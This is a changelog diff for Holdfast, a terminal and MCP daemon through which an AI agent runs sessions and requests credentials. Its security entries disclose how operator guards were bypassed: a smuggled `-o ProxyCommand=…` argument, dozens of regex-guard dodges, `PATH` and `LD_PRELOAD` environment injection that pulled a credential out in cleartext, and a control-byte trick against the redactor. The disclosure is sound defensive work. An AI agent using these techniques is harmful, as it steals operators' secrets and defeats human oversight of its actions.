-  the same key the Unix down-path emits, so a consumer needs no Windows arm.
-
-  `holdfast mcp` does not refuse: stdio-only is the Windows transport, so it
-  serves in-process and says once that hybrid mode is unavailable and sessions
-  end with the process.
-- **Holdfast now warns rather than refuses about Windows file permissions.**
-  There are no mode bits to apply, so the runtime directory, logs and
-  `config.toml` are used with the ACL they inherit — owner, `SYSTEM` and
-  `Administrators` inside a normal user profile. One stderr warning per process
-  says so, and says that the config trust check (owner and mode) does not run.
-  An ACL-shaped answer is still owed.
-- **CI no longer skips itself on documentation-only changes.** `paths-ignore`
-  is removed from both of `ci.yml`'s triggers: a workflow filtered out at the
-  `on:` level posts no check run at all, so any *required* status check on it
-  would leave every docs-only pull request pending forever. Standard runners
-  are free on public repositories, so the filter bought nothing.
-- **A surviving mutant now fails the mutation sweep.** Its dated
+- On Windows native, seven daemon-backed subcommands — `daemon run`,
+  `daemon start`, `daemon status`, `list`, `logs`, `attach`, `watch` — refuse
+  with exit 64 from a single shared message; `list` and `logs` name the MCP
+  tool that does answer there. `holdfast mcp` still serves, in-process.
+- `daemon stop` on Windows exits 0 with "no daemon running", and
+  `daemon status --json` still prints `{"running": false, "supported": false,
+  "reason": …}` before exiting 64, so a `--json` consumer needs no Windows arm.
+- Holdfast warns rather than refuses about Windows file permissions: the
+  runtime directory, logs and `config.toml` are used with the ACL they inherit,
+  and the config trust check does not run. An ACL-shaped answer is still owed.
+- CI no longer skips itself on documentation-only changes — `paths-ignore` is
+  gone from both of `ci.yml`'s triggers, because a workflow filtered out at the
+  `on:` level posts no check run and a required check on it would leave every
+  docs-only pull request pending forever.
+- A surviving mutant now fails the mutation sweep; its dated
   `continue-on-error` calibration exemption is retired.
-- **A hung test is now killed and named.** The `test` job runs the suite under
-  `cargo nextest` (0.9.143, pinned by the digest of the tarball fetched)
-  instead of `cargo test`, at a per-test budget of a `SLOW` warning at 60s and
-  a kill at 300s — `.config/nextest.toml`, which applies to a developer's local
-  run identically.
+- The `test` job runs under `cargo nextest` (0.9.143, digest-pinned) at a 60 s
+  `SLOW` warning and a 300 s per-test kill, so a hung test is named rather than
+  only turning the job red. Doctests get their own `cargo test --doc` step,
+  because nextest does not run them at all.
+- For library consumers, `daemon::{server, spawn, peer, attach_server}`,
+  `protocol::client` (with its `ClientError` / `ControlClient` re-exports) and
+  `mcp::shim` are `#[cfg(unix)]`; `daemon::paths`, `protocol::{frame, handshake,
+  method}` and the rest stay cross-platform. Nothing changes on Unix, and
+  nothing is removed — `holdfast-core` did not compile for Windows at all
+  before this release ([#19]).
 
-  **What was missing was attribution, not redness.** Every job in `ci.yml` has
-  carried an explicit `timeout-minutes` since the file was written, so a wedged
-  test already turned the build red; `test` sits at 40 minutes. What that could
-  never do was say *which* test. `cargo test` has no per-test timeout, so the
-  kill arrives from outside the process, cargo has printed nothing about the
-  row still in flight, and the log ends mid-suite naming nobody — a red build
-  and a blind one. nextest prints `SLOW`, then `TERMINATING`, then `TIMEOUT`,
-  names the test in each, preserves what that test printed before it hung,
-  escalates SIGTERM to SIGKILL after a grace period, and exits 100.
+### Fixed
 
-  **300s is bounded on both sides by measurements rather than by taste.** Above
-  it: the slowest single test this suite has been observed to take is
-  **127.70s** on the hosted runner —
-  `tier_b_stays_off_and_the_control_path_stays_responsive_under_load`, the
-  figure `scripts/ci-skip-census.sh`'s own fixture records verbatim — against
-  ~26s for the slowest locally on 4 cores. Below it: the per-test kill has to
-  land well inside the job's own 40 minutes, or the outer timeout takes the
-  process group and the log with it and nothing has been gained.
-
-  **Two flags are load-bearing and neither looks it.** `--success-output
-  immediate` replaces `--show-output`; without it a *passing* test's
-  `skipping: …` notice is shown to nobody and the skip census reads a log that
-  cannot contain what it looks for. `--no-output-indent` keeps captured output
-  at column 0 — nextest's default indents it four spaces, which silently
-  defeats every `^`-anchored grep in that census and would have reported a
-  clean sweep on a run that skipped two rows. The census's vacuity gate also
-  learned nextest's name for the detection binary, `holdfast-core::detection`,
-  where cargo printed `Running tests/detection.rs` **on stderr**. The `2>&1`
-  in that pipeline was already load-bearing for exactly that one line; it is
-  now load-bearing for all of it, because nextest writes its *entire* stream
-  to stderr — status lines, captured output, summary — and leaves stdout
-  empty, so dropping it would `tee` a zero-byte log. The census's self-test
-  grew a second, nextest-shaped fixture family rather than trusting the new
-  branch: 32 checks to 42.
-
-  **One of those fixtures is colourised, and that is the one that earned its
-  place.** `CARGO_TERM_COLOR: always` is set workflow-wide, nextest obeys it,
-  and the binary name therefore arrives wrapped in its own SGR pair — the byte
-  after `holdfast-core::detection` is `ESC`, not the space the first version of
-  the vacuity token required. That pattern was green on every fixture here, on
-  every local run and on every uncoloured pipe, and red **in CI alone**; it was
-  found by watching it fail there. The boundary is now spelt as "not an
-  identifier character", which holds with or without colour, and `nx-color.log`
-  is what stops the next such assumption getting past the self-test. The colour
-  setting itself is left alone: the Actions UI renders it, and the captured
-  libtest block — where every other anchored grep reads from — stays plain
-  regardless, because those processes are on a pipe.
-
-  **Doctests get their own `cargo test --doc` step, because nextest does not
-  run them at all.** Both of this workspace's doctests are `ignored`, so the
-  step measures nothing today; it is there so that the capability cannot
-  disappear without a diff. The census step is now `if: always()`, since an
-  exit 100 would otherwise skip the census on exactly the run this change was
-  made to diagnose. `TEST_THREADS` survives, mapped to nextest's `-j`: its
-  default is one process per core, which is the nproc-tracking that pin exists
-  to refuse, and `scripts/ci-flake-hunt.sh` reads the value to assert it is
-  oversubscribed relative to CI.
-
-  Measured on the runner under this change: `1331 tests run: 1331 passed
-  (1 slow), 0 skipped` in 193.35s, with one `SLOW [> 60.000s]` naming
-  `tier_b_stays_off_and_the_control_path_stays_responsive_under_load` — the
-  row the 127.70s figure belongs to. Both thresholds behaved as chosen: 60s
-  named the one row worth watching, 300s killed nothing that was working.
-
-### Added
-
-- **A `windows-2022` CI job.** Native MSVC clippy over `--all-targets`,
-  `tests/source_guards.rs`, the `#[cfg(windows)]` CLI arms *executed*, and a
-  **filtered `--lib`** naming the modules whose Windows arm differs from its
-  Unix one — the first job in this repository that runs Holdfast's own code on
-  Windows. That filter is not a convenience: it is the only gate anywhere that
-  kills the `.append(true)` → `.truncate(true)` mutation, which would zero the
-  §9.4 audit trail on every start. The **full** `--lib` is still not run: 55
-  of its tests spawn a real shell (measured natively at 721 passed / 55
-  failed, in three modules), and gating those is 0.0.11's.
+- Autofill no longer misses a credential prompt drawn before its listener was
+  armed; the listener replays the current echo-off episode once, de-duplicated
+  against a delivered edge, which also closes the lagged-receiver case
+  ([#106]).
+- A fulfilled secret request is no longer reported as `outcome: "cancelled"`
+  when autofill answered the prompt before an attached client's raise ([#105]).
+- `wait_for_pattern` no longer reports `session_died` over output the child
+  really produced; the final rescan waits on `Session::reader_finished()`
+  rather than on `is_alive()` ([#42]).
+- `interrupt` now documents that a signal can land on the shell before it has
+  handed the terminal to the job, and that the remedy is to call again — the
+  gap belongs to the product and is the one a real terminal has ([#112]).
+- A `settle_threshold_ms` at or above the deadline no longer makes a
+  pattern-less wait time out beside a true `AtPrompt`; the settle window is
+  clamped against the time left from the first idle sample rather than from the
+  call.
+- `holdfast mcp` on Windows writes its audit trail again: `USERPROFILE` is the
+  fallback where `HOME` and the `XDG_*` variables are unset, and an empty `HOME`
+  now counts as no answer rather than as one. `config.toml` was ignored on the
+  same machine for the same reason.
+- `holdfast attach` no longer discards an ending it has already been sent: the
+  unsolicited startup `Resize` is best effort and the reader names the ending,
+  so attaching to an already-exited session exits 0 instead of 2 onto a blank
+  terminal ([#39]).
+- The "the daemon closed the connection" diagnostic is reachable again — the
+  startup write returned before the frame loop ran, so a genuinely dead daemon
+  and an exited session were indistinguishable to an operator ([#39]).
+- The Windows build compiles again: 31 clippy errors on
+  `x86_64-pc-windows-gnu`, 27 of them in the daemon subsystem and four in
+  `config.rs` and `protocol/client.rs`, closed by compile-gating rather than by
+  porting ([#19]).
+- `a_connection_mid_handshake_holds_off_the_client_less_exit` half-closes with
+  `shutdown(2)` instead of `close(2)`: a forked sibling's inherited copy of a
+  connected descriptor keeps the socket open, so the daemon read no EOF. No
+  product change ([#52], the same descriptor-inheritance window as [#21]).
+- Five `screen.rs` rows wait on the rendered grid, `Session::screen_tracking`
+  or `Session::cursor_signal` rather than on the ring buffer, which the reader
+  publishes one step earlier. Test-only.
+- `every_emitted_unix_field_is_a_number`,
+  `every_nested_object_a_tool_returns_has_its_key_set_pinned` and the
+  `exited_session` fixture wait on a closed command-history entry or on the
+  reader's drain flag instead of on the output bytes. Test-only.
+- `no_output_is_classified_between_the_echo_sample_and_the_answer` no longer
+  reads the command count between the reader's two publications. Test-only.
+- Three `secret::binding` rows synchronised on a signal that did not mean what
+  their next line needed, and each now carries the delay that produced its
+  figure. `buffer_until_count` was added alongside, and caught a
+  `write_secret_if_unread` mutation that had passed all 54 rows in the module.
 
 ### Security
 
-- **A refused `SecretInput` submission is now zeroed.** The two reject paths —
-  `too_large` and `unknown_request_id` — dropped the decoded credential as a
-  plain `Vec<u8>`, whose `Drop` does not zero, leaving it in the heap until the
-  allocator reused the page (GH #57).
+- A refused `SecretInput` submission is now zeroed: the `too_large` and
+  `unknown_request_id` arms dropped the decoded credential as a plain
+  `Vec<u8>`, whose `Drop` does not zero. Nothing read the value — what it broke
+  was the zeroing discipline, on the two arms a hostile submission lands on
+  ([#57]). Residuals filed from the same review: [#82], [#83], [#84], [#85],
+  [#86].
+- `ci-hygiene.sh`'s dated calibration exemption no longer applies to a workflow
+  that merely mentions the marker inside a comment — it must *be* a comment
+  line — so a file can no longer exempt itself from the bans on
+  `continue-on-error`, unpinned actions and `secrets.` references.
 
-  **This was not a disclosure.** Nothing read the value: it never reached the
-  agent, a log, another client, or the child. What it broke is §9.2's zeroing
-  discipline, which is the milestone's whole security model, and it broke it on
-  precisely the two arms where a hostile or malformed submission lands.
-
-  The fix is not a zeroing call added to each arm. The submission is taken into
-  `SecretBytes` at the point it is decoded, so *dropping it* is the zeroing and
-  every exit **from that arm** inherits it.
-
-  **Scoped deliberately, and narrower than this entry first claimed.** The
-  pre-merge review found three statements in the first draft that were not true,
-  and they are worth recording rather than quietly deleting:
-
-  - It said the fix also closed a `select!` cancellation window on the accept
-    path. There was never one — no suspension point sits between the decode and
-    the write, and a future can only be dropped at one.
-  - It said every exit inherits the zeroing. Every exit *from the arm* does. A
-    `SecretInput` refused by the ReadOnly gate, or decoded as `BadFields`, never
-    reaches the arm and still drops its cleartext frame un-zeroed across a real
-    `await` — a wider hole than the one this closes, now GH #82.
-  - The decoded buffer is not the single allocation `Drop` owns above 4 KiB.
-    `ciborium` fills a byte string in 4096-byte chunks and grows by doubling, so
-    an oversize submission has already been copied between freed, un-zeroed
-    blocks before anything owns it — GH #83, and it is the `too_large` case
-    specifically.
-
-  Also filed from the same review: GH #84, #85 and #86.
-
-- `ci-hygiene.sh`'s dated calibration exemption was granted to any workflow
-  merely *mentioning* the marker, because the grep was unanchored — so a file
-  that documented the marker in a comment silently exempted itself from every
-  rule in that script, including the bans on `continue-on-error`, unpinned
-  actions and `secrets.` references. The marker must now BE a comment line
-  rather than appear in one, matching the anchoring `RELEASE-WORKFLOW` already
-  carried, and the mechanism has self-test coverage in all three directions.
-
-### For library consumers
-
-- `daemon::{server, spawn, peer, attach_server}`, `protocol::client` (and its
-  `ClientError` / `ControlClient` re-exports) and `mcp::shim` are `#[cfg(unix)]`
-  from this release. `daemon::paths`, `protocol::{frame, handshake, method}`
-  and everything else stay cross-platform: the wire shape is a claim about the
-  protocol, not about Unix.
-- **This is not a removal, and calling it one would overstate it.** Nothing
-  changes on Unix. On Windows `holdfast-core` did not compile at all before
-  this release — 31 errors, the same 31 the [#19] entry above attributes — so
-  there was no cross-compiling build for a consumer to lose; that target goes
-  from having no API to having this one. **This line read 32**, disagreeing
-  with that entry sixty lines up about a single measurement:
-  `2>&1 | grep -cE '^error'` counts cargo's own trailing summary line —
-  "could not compile ... due to 31 previous errors" — as a 32nd error. Count
-  the JSON messages, or read the number the summary line itself gives.
-
-[#19]: https://github.com/Sertelegger/holdfast/issues/19
-[#39]: https://github.com/Sertelegger/holdfast/issues/39
-[#42]: https://github.com/Sertelegger/holdfast/issues/42
-[#52]: https://github.com/Sertelegger/holdfast/issues/52
-
-## [0.0.7] — 2026-09-01
-
-### Upgrading to 0.0.7 on macOS
-
-**Stop the daemon before upgrading.** 0.0.7 moves the macOS runtime directory
-from `~/Library/Application Support/holdfast` to `~/.holdfast`, so every
-platform without `XDG_RUNTIME_DIR` now uses one path. There is no migration and
-none is planned (GH #73).
-
-A 0.0.6 daemon left running is **invisible to 0.0.7**, which will start a second
-one at the new path. The old daemon keeps its live PTY sessions and
-`holdfast daemon stop` can no longer reach it, because the new binary computes a
-different socket path; recovery is `pkill holdfast`, which drops whatever those
-sessions were holding. No privilege boundary is crossed — the old socket stays
-`0600` inside a `0700` directory — it is an orphan, not a hole. The old
-directory can be deleted once nothing is running from it.
-
-**A terminal now hosts one interactive client per session.**
-`holdfast attach` declares which terminal device its keyboard is, and a second
-`ReadWrite` client on a terminal that already has one is refused with
-`terminal_busy` rather than admitted. Attaching from *another* terminal is
-unaffected — multi-client attach is a feature and is untouched — and
-`holdfast watch` never contends, in either order.
-
-The refusal exists because the alternative is silent: two processes reading one
-terminal are handed alternate bytes by the kernel, so an operator's `Ctrl-B d`
-is split between them and whichever misses it keeps running. Measured exactly
-that way, one client exiting 0 while the other survived. tmux never needs this
-guard because a foreground client owns the terminal and job control stops a
-backgrounded one with `SIGTTIN` the moment it reads; `holdfast attach` has no
-such protection and has to state the constraint itself.
-
-**The session is sized to the smallest attached writer**, not to whichever
-resized last (GH #66). Last-writer-wins does not converge: two clients dragging
-their windows at once alternate between their own readings for as long as either
-keeps moving, which was reported as a resize flood whose sizes oscillated
-rather than settling. A departing writer gives its columns back. This is a
-semantics change on a §23.3-gated surface and was taken through that gate
-deliberately.
-
-Alongside it, **a resize notice is coalesced rather than printed per frame** in
-both `attach` and `watch` — the notice now names where a drag landed, once —
-and a diagnostic is written in a single `write_all`, so two clients sharing a
-terminal can no longer shred each other's output mid-word.
-
-`PROTOCOL_MAJOR.PROTOCOL_MINOR` moves to **1.1**, with a new
-`tests/wire-shape/1.1.golden`. `Attach` gains an optional `terminal` and
-`AttachReject.reason` gains `terminal_busy`; both are additive, and the new
-token is unreachable for any peer that did not opt in by sending the field.
-
-**`wait_for_pattern`'s `pattern` is optional.** Omitted, the call waits until
-the session stops executing and answers `reached` instead of `matched` (GH #62).
-The regex form is for a *program's* prompt — `Password:`, `(gdb)`, `>>>` — and
-never for the shell's own, which is a guess about the operator's `$PS1` that no
-agent is in a position to make: against a customised prompt it simply never
-matches, and the call reports a timeout for a command that finished long ago. A
-wait that expires against a session already at a measured prompt now says so in
-`warning`.
-
-**The agent can ask for a credential it is never allowed to see.**
-`request_secret_input` blocks the calling tool while a human — or, where an
-operator has configured one, a credential store — supplies a value that goes
-from the client straight to the child's PTY. It enters no MCP response, no log
-and no broadcast to other attached clients, so there is no boundary at which a
-redactor could run on it, which is the point: the value is *absent* from those
-surfaces rather than redacted on them.
+## [0.0.7] — 2026-09-01 (Carabiner)
 
 ### Added
 
 - **`request_secret_input`**, the twelfth MCP tool. It blocks until an attached
   human answers, a configured provider resolves the value, the child stops
-  asking, or the call's own `timeout_secs` elapses. What the agent gets back is
-  a status and a **byte count** — never the value, and never a handle it could
-  exchange for one.
+  asking, or `timeout_secs` elapses, and returns a status and a byte count —
+  never the value and never a handle that could be exchanged for one.
 - **Operator-declared session profiles** (`[[security.profiles]]`) and
-  `start_session(profile:, vars:)`. The operator writes the **process** — the
-  program, the argument template, the environment and the working directory —
-  and the agent supplies values into named slots. See **Security** for the
-  whole of it.
-- **`profile` on the session record and on `session_start`.** `status`,
-  `list_sessions` and the audit log now say **where a session's command line
-  came from** — the name of the `[[security.profiles]]` entry it was started
-  from, or `null` for one started with `command`/`args`.
-
-  It is there because `command` and `args` cannot say it. A profile-started
-  session and an agent-authored one that produced the same argv were otherwise
-  **byte-identical** on both surfaces, and only the first can ever receive a
-  keychain credential — so an operator reading the trail could not tell which
-  they were looking at. `null` is affirmative rather than an absent key,
-  because *"this session could not have received a credential"* is the fact
-  being looked for and a missing field cannot be told from a forgotten one.
-
-  It carries the **name and nothing more**, on `binding_resolved`'s rule: not
-  the operator's argument template, and not the `vars` the agent supplied. It
-  is the one string on the record that is **not** redacted, and deliberately:
-  it comes out of the operator's own config file, and running a built-in rule
-  over it would let the redactor blank out a name the operator chose.
-- **Keychain autofill from operator-declared bindings** (`[[security.secret_bindings]]`).
-  A binding names a **profile**, an optional prompt pattern, a provider
-  (`secret-service`, `security`, `pass`, `op`) and a reference in that provider.
-  The agent supplies no part of the lookup and cannot enumerate what exists:
-  every way a binding fails to resolve falls through silently to the human
-  prompt, so *"your binding is exhausted"* is indistinguishable from *"you have
-  no binding"*.
-
-  **What it *can* do, said plainly rather than overstated:** naming a profile
-  is naming a binding, so an agent with three credentialed profiles available
-  to it chooses among three credentials. The bound is that the operator wrote
-  the set, not that the agent is absent from the choice. Earlier drafts of
-  §9.6 said the agent had *"no input into which entry is selected"*; that was
-  false then and is false now, and this section has already been bitten once by
-  a §9.6 sentence that read as protective and was load-bearing the other way.
-- **`require_confirm` on a binding**, with the approval round trip to go with
-  it: a new `BindingApprovalRequired` server frame and `ApproveBinding` client
-  frame. The credential is resolved **after** the human approves and not
-  before — a value fetched speculatively and discarded on denial is a
-  credential read out of a store nobody agreed to read.
+  `start_session(profile:, vars:)`: the operator writes the program, the
+  argument template, the environment and the working directory, and the agent
+  supplies values into named slots ([#46]).
+- **`profile` on the session record and on `session_start`**, so `status`,
+  `list_sessions` and the audit log say where a session's command line came
+  from. It is `null` for a `command`/`args` session, carries the name and
+  nothing more, and is the one string on the record that is not redacted.
+- **Keychain autofill from operator-declared bindings**
+  (`[[security.secret_bindings]]`), naming a profile, an optional prompt
+  pattern, a provider (`secret-service`, `security`, `pass`, `op`) and a
+  reference. Every way a binding fails to resolve falls through silently to the
+  human prompt, so the agent cannot enumerate what exists.
+- **`require_confirm` on a binding**, with the `BindingApprovalRequired` and
+  `ApproveBinding` frames to go with it. The credential is resolved after the
+  human approves and never before.
 - **A notice in the session buffer when a secret is wanted and nobody is
   attached**, so an agent reading `read_output` can see why its child stopped.
-  It reaches the buffer only: not the child, not the prompt the detector
-  reports, and not the idle deadline.
+  It reaches the buffer only — not the child, not the reported prompt, not the
+  idle deadline.
 - **`not_supported_on_platform`**, for a build whose platform has no
   out-of-band secret entry.
+- **A terminal hosts one interactive client per session.** `holdfast attach`
+  declares which terminal device its keyboard is, and a second `ReadWrite`
+  client on a terminal that already has one is refused with `terminal_busy`.
+  Attaching from another terminal is unaffected, and `holdfast watch` never
+  contends.
+- **Protocol `1.1`**, with a new `tests/wire-shape/1.1.golden`: `Attach` gains
+  an optional `terminal` and `AttachReject.reason` gains `terminal_busy`. Both
+  are additive and unreachable for a peer that did not opt in.
 
 ### Changed
 
-- **Two config shapes that loaded at 0.0.6 now stop the daemon.** Both keys were
-  documented *"Unread — 0.0.7"* before this milestone, so an operator who set
-  them ahead of time had a config that loaded and did nothing; after upgrade the
-  daemon binds no socket and prints the offending key. Both refusals are
-  deliberate, and the error names what to change:
-
-  - `security.autofill_on_echo_off = true` with `security.secret_provider =
-    "prompt"` (which is the default). Autofill resolves from a credential store
-    and `prompt` has none, so the pair reads *"on"* and behaves *"off"* — for
-    the single most consequential switch in the file. Set `secret_provider` to
-    `"keychain"` or `"both"`, or leave autofill off.
-  - A `[[security.secret_bindings]]` entry whose `match_prompt` is not a valid
-    regex, or whose `profile` names no `[[security.profiles]]` entry. The whole
-    block was unread at 0.0.6, so a typo'd pattern was inert; it is now a load
-    error, because a binding that never matches is indistinguishable from a
-    credential store that is down.
-
-  §10.2's published example is unaffected: it ships `autofill_on_echo_off =
-  false` alongside `secret_provider = "prompt"`, which passes the new rule.
-
+- **The macOS runtime directory moves** from
+  `~/Library/Application Support/holdfast` to `~/.holdfast`, so every platform
+  without `XDG_RUNTIME_DIR` uses one path. **Stop the daemon before
+  upgrading**: there is no migration, a 0.0.6 daemon is invisible to 0.0.7, and
+  `holdfast daemon stop` can no longer reach it — recovery is `pkill holdfast`
+  ([#73]).
+- **`wait_for_pattern`'s `pattern` is optional.** Omitted, the call waits until
+  the session stops executing and answers `reached`; the regex form is for a
+  *program's* prompt and never for the shell's own, which is a guess about the
+  operator's `$PS1`. A wait that expires against a session already at a
+  measured prompt now says so in `warning` ([#62]).
+- **The session is sized to the smallest attached writer**, not to whichever
+  client resized last, and a departing writer gives its columns back;
+  last-writer-wins does not converge between two clients dragging at once
+  ([#66]).
+- **A resize notice is coalesced rather than printed per frame** in both
+  `attach` and `watch`, and a diagnostic is written in a single `write_all`, so
+  two clients sharing a terminal cannot shred each other's output mid-word
+  ([#66]).
+- **Two config shapes that loaded at 0.0.6 now stop the daemon**, with the
+  offending key named: `security.autofill_on_echo_off = true` alongside
+  `security.secret_provider = "prompt"`, which reads *on* and behaves *off*;
+  and a `[[security.secret_bindings]]` entry whose `match_prompt` is not a
+  valid regex or whose `profile` names no `[[security.profiles]]` entry.
 - **Every `[[security.secret_bindings]]` entry an operator has written stops
-  loading, and the error names the key.** `match_command` and `match_example`
-  are gone and `profile` is required, so a binding carrying either fails
-  §10.1's unknown-key rule. Declare a `[[security.profiles]]` for the command
-  line the binding was for and point the binding at it; see **Security** for
-  why a deprecation window on those two keys would have been a deprecation
-  window on the bypass class.
-
-- **`start_session`'s `inputSchema` no longer marks `command` required, and a
-  call that omits it now returns a JSON-RPC error instead of a tool result.**
-  A 0.0.6-facing difference that is not a behaviour change, and it is on the
-  wire. (The entry below it is the other one.)
-
-  | | 0.0.6 | 0.0.7 |
-  |---|---|---|
-  | `inputSchema.required` | `["command"]` | **absent** |
-  | `inputSchema.properties.command` | `{"type":"string"}` | `{"type":["string","null"],"default":null}` |
-  | `start_session {"args":["x"]}` | `result.isError: true`, text *"failed to deserialize parameters: missing field `command`"* | `error.code: -32602`, *"start_session needs either `command` or `profile`"* |
-
-  **Why.** `command` and `profile` are mutually exclusive and exactly one must
-  be supplied. That is a `oneOf`, and there is no way to derive one — so
-  `command` became `Option<String>`, the `required` array lost its only entry,
-  and the constraint moved into the tool body, which refuses the
-  neither-supplied and both-supplied cases by name.
-
-  **What it costs a client.** The *schema* no longer tells a caller — or a
-  model reading `tools/list` — that a command is needed. What is left is the
-  prose on the properties: `command`'s description says *"Mutually exclusive
-  with `profile`; supply exactly one"* and `profile`'s says *"Mutually
-  exclusive with `command`/`args`"*. Those two sentences now carry the whole
-  contract, so `tests/schema.rs::start_session_advertises_profile_and_vars_and_no_required_command`
-  pins both phrases by name — dropping a word there is a silent contract
-  change with nothing else to catch it.
-
-  And a client that branches on `result.isError` takes its transport-error
-  path for this one input instead. Not a new class — a bad `cwd` or a bad
-  `screen_tracking` was already `invalid_params` at 0.0.6 — but `command`
-  moved into it.
-
-- **`AwaitingSecret.prompt_text` can now be redacted where 0.0.6 left it
-  intact.** `Session::prompt_last_line_redacted` moved from `redact_str` to
-  `redact_for_display`, which **strips control characters before** redacting
-  rather than redacting the raw line. `AwaitingSecret` is 0.0.6's frame (§7.5)
-  and its field is unchanged in shape; what it carries can differ. (The
-  function's other consumer, `BindingApprovalRequired.prompt_text`, is new in
-  0.0.7 and has no 0.0.6 behaviour to differ from.)
-
-  Intended, and the reason for the change: a control byte between a label and
-  a credential let a prompt line reassemble on a human's screen into something
-  the redactor never saw as one token. Stripping first closes that.
-
-  **It is a control-character filter and not an ANSI-sequence stripper**, and
-  that distinction is the whole of the paragraph below: `one_line_for_display`
-  drops the ESC byte and leaves the `[2K` that followed it. The module's real
-  sequence stripper is `ansi::strip` — the `AnsiStripper` state machine — and
-  it is a different function that is not on this path.
-
-  The part worth writing down is a **side effect nobody would predict from
-  either change alone**. Dropping a control byte joins the text on each side
-  of it, and the joined token can match a rule that neither side matched:
-
-  ```
-  0.0.6:  "Password: \x1b[2K\rholdfast attach: all clear"   (unchanged)
-  0.0.7:  "Password: [REDACTED:generic] attach: all clear"
-  ```
-
-  Dropping the `\x1b` **and the `\r`** glues `[2K` onto `holdfast`, and a
-  **pre-existing, unchanged** generic rule then matches the result. The
-  mechanism, since "a rule started matching" is not an explanation:
-  `generic-secret-assignment` requires a value of eight characters or more
-  after a `password`-ish label. In the raw line the `\r` ends the value after
-  four (`\x1b[2K`), below the floor; once both control bytes are gone the
-  value group is `[2Kholdfast`, eleven characters, and it matches. Confirmed
-  by feeding the post-strip text to 0.0.6's own `redact_str`, which produces
-  the identical marker, and by `git diff v0.0.6 HEAD -- data/redaction_default.toml`
-  being empty. The rule did not change; the strip newly hands it a token that
-  was not in the source.
-
-  The direction is safe — a human-facing display field over-redacts, and
-  over-redaction on a prompt label is not a leak — but it does qualify the
-  property this strip is otherwise described by, *"the payload must stay
-  visible; only its power to overwrite is removed"*: for a prompt where a
-  stripped escape abuts adjacent text, some payload may not stay visible.
+  loading.** `match_command` and `match_example` are gone and `profile` is
+  required, so a binding carrying either fails the unknown-key rule; declare a
+  profile for the command line the binding was for ([#46]).
+- **`start_session`'s `inputSchema` no longer marks `command` required**, and a
+  call omitting both `command` and `profile` returns JSON-RPC `-32602` instead
+  of a tool result. The two are mutually exclusive — a `oneOf` no schema here
+  can express — so the constraint moved into the tool body, and the two
+  property descriptions now carry the whole contract.
+- **`AwaitingSecret.prompt_text` strips control characters before redacting**
+  rather than redacting the raw line, closing the case where a control byte
+  split a credential past the redactor. Dropping a byte can join the text on
+  either side of it into a token that matches a rule neither side matched, so a
+  prompt label may newly over-redact.
 
 ### Security
 
-- **The operator writes the command line and the agent fills named slots in it**
-  (GH #46). This is what closed GH #45, and it retires the bypass class rather
-  than mitigating it: `match_command` and `match_example` are **gone**, along
-  with the load-time corpus that judged one against the other.
-
-  ```toml
-  [[security.profiles]]
-  name    = "prod-ssh"
-  program = "ssh"                       # a literal; no {…}
-  args    = ["{user}@{host}"]
-  cwd     = "/srv/deploy"               # literal, optional
-
-    [security.profiles.vars]
-    user = "^[a-z][a-z0-9_-]{0,30}$"
-    host = "^prod-0[12]$"
-
-    [security.profiles.env]             # literal on both sides
-    SSH_AUTH_SOCK = "/run/holdfast/agent.sock"
-
-  [[security.secret_bindings]]
-  name    = "prod-ssh-cred"
-  profile = "prod-ssh"
-  ```
-
-  `start_session` gains `profile` and `vars`, mutually exclusive with
-  `command`/`args` **and with `env`/`cwd`**. A `command`/`args` session
-  *behaves* exactly as it did at 0.0.6, `env` and `cwd` included — nothing is
-  at stake in a session that cannot receive a credential — but the tool's
-  **advertised schema did change**, and a call that omits `command` now fails
-  through a different channel. See *`start_session`'s `inputSchema` no longer
-  marks `command` required* under **Changed**.
-
-  **Why the shape changed rather than the check.** Four guard shapes over
-  `match_command` were tried and each was defeated by someone who attacked it
-  instead of reading it: anchoring (bypassed at the other end), a ~180-line
-  syntactic scanner (20 accepted spellings), a 9-probe behavioural corpus (the
-  whole insertion class missed), and a 51-probe corpus — where a review found 46
-  bypasses and **the cheapest dodge fell from six characters to one**, `[^ ]*`,
-  because all 51 probe texts contain a space. Widening the corpus made the dodge
-  *cheaper*, not dearer: a larger probe set shares more structure, and a negated
-  class excludes shared structure in a single stroke. That measurement is what
-  ended the argument.
-
-  **The asymmetry that makes a slot a different problem from a command line.** A
-  slot is bounded — one value, matched whole, with no "rest of the line" to
-  append to. Arguments come from the template, so the agent cannot *add* one.
-  Therefore **a badly-written slot pattern is bounded damage**: `host = ".*"`
-  lets the agent choose a hostname and it still cannot add a flag, where one
-  sloppy `match_command` gave it unlimited extra arguments. `host = ".*"` is
-  accepted for that reason, and `match_command = ".*"` was a load error for the
-  other.
-
-  **Substitution happens within one argv element.** `args` is an array of
-  strings and exactly one output element is produced per template element, so a
-  value containing spaces, quotes, `;`, `&&` or a leading `-` stays a single
-  argument and cannot become a second one. There is no join, no split and no
-  shell. GH #45's reproduction is therefore not merely refused through a profile
-  — it is **not expressible**: `ssh prod-01 -o ProxyCommand=…` is a four-element
-  argv, and `program = "ssh"` with `args = ["{user}@{host}"]` is two.
-
-  **The rules, each a load error naming the key.** `program`, `env` (keys
-  **and** values) and `cwd` are literals and admit no `{…}` — a slot in any of
-  them lets the agent choose which binary actually runs, which no pattern over
-  an *argument* can bound, and they are one rule because they are one hole.
-  Every `{name}` in `args` has a `vars` entry and every `vars` entry is used by
-  a slot: a slot with no pattern is unguarded, and a pattern with no slot is a
-  typo the operator should learn at startup rather than at 3am. Each var
-  pattern compiles wrapped exactly as the renderer wraps it (`\A(?:…)\z`, by
-  the same function at both ends). Profile names are unique, and a binding
-  naming an unknown profile is refused.
-
-- **The operator writes the *process*, not only the command line** (GH #55).
-  Profiles stopped the agent authoring the command line and left it authoring
-  the process: `start_session` took `env` and `cwd` from the agent on every
-  arm. **Driven twice.** `env: {PATH: …}` repointed a profile whose literal
-  `program` was `ssh` at the agent's own binary — the credential came back out
-  of `read_output` in cleartext, `redactions: {}`. `env: {LD_PRELOAD: …}`, with
-  `program` an **absolute path** and therefore the obvious fix for the first,
-  captured the credential out of the operator's binary running the operator's
-  argv.
-
-  **`require_confirm` is no mitigation.** The human is shown
-  `command_line: "ssh prod-01"` — the legitimate line, because it *is* the
-  legitimate line. The redirection lives in the environment, which the approval
-  frame does not carry; and with `autofill_on_echo_off = true` there is no tool
-  call and no human at all.
-
-  **The class is the whole environment, not a list of dangerous names.**
-  `LD_PRELOAD`, `BASH_ENV`, `ENV`, `PERL5OPT`, `PYTHONSTARTUP`, `SSH_ASKPASS`
-  and `LESSOPEN` are members of it and not the list of it, so an allowlist or a
-  blocklist of variables is the wrong shape here for exactly the reason the
